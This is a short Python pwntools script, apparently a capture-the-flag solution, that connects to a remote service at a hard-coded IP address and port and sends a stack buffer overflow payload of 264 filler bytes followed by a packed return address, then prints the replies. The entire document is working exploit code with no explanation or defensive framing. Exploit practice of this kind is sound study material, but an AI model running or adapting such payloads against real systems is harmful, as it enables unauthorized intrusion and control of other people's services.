from pwn import *

p = remote('159.65.13.76', 33103)

payload = 'A'*264+p64(0x4007ea)
print p.recv()
p.sendline(payload)
print p.recv()
